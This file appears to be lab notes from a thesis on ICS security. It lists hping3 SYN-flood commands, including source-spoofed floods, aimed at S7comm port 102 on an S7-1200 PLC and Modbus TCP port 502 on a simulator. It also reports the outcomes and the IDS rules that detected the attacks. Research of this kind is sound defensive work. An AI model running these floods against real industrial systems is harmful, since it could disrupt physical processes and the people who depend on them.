# hping3 — Denial of Service Commands

Commands used in Chapter 6.7 of the thesis for DoS attack simulation
against S7comm (TCP/102) and Modbus TCP (TCP/502) services.

---

## DoS on S7comm — PLC S7-1200 (port 102)

```bash
# SYN flood — port 102 (ISO-on-TCP / S7comm)
hping3 -S --flood -p 102 192.168.0.50

# SYN flood with random source IP (spoofed)
hping3 -S --flood --rand-source -p 102 192.168.0.50

# Controlled rate — 1000 packets/s (for measurement)
hping3 -S -p 102 --faster 192.168.0.50
```

---

## DoS on Modbus TCP — ModRSsim2 (port 502)

```bash
# SYN flood — port 502 (Modbus TCP)
hping3 -S --flood -p 502 192.168.0.10

# SYN flood with random source IP
hping3 -S --flood --rand-source -p 502 192.168.0.10
```

---

## Results observed in thesis

| Target | Port | Result |
|---|---|---|
| ModRSsim2 | 502 | Became unresponsive under SYN flood — service disruption confirmed |
| PLC S7-1200 | 102 | Remained operational — handles multiple parallel sessions by design |

Key finding: S7-1200 resilience is not full immunity — the PLC handled the specific SYN flood
used in this test. More advanced techniques (e.g. DDoS, application-layer exhaustion)
may produce different results.

---

## Detection

Both attacks triggered Wazuh alerts via:
- Zeek rules 100953 (DoS TCP/102) and 100992 (DoS TCP/502) — level 12
- Suricata rules 200250 (TCP/502) and 200500 (TCP/102) — level 12

---

> **Disclaimer**: For use in isolated lab environments only.
